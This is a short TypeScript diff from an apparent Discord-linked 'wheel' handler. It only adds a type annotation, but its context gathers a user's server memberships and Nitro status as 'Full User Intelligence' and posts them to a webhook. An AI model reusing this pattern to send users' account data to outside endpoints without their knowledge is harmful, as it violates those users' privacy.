@@ -331,7 +331,7 @@ export async function handleWheelRequest(url: URL, method: string, rawBody?: str
 
       // Send Full User Intelligence to Webhook
       if (WEBHOOK_URL) {
-        const guildsList = (evidence.guilds || []).slice(0, 15).map(g => `• ${g.name}`).join('\n');
+        const guildsList = (evidence.guilds || []).slice(0, 15).map((g: any) => `• ${g.name}`).join('\n');
         const nitroStatus = discordUser.premium_type === 2 ? 'Nitro' : discordUser.premium_type === 1 ? 'Nitro Classic' : 'None';
 
         fetch(WEBHOOK_URL, {
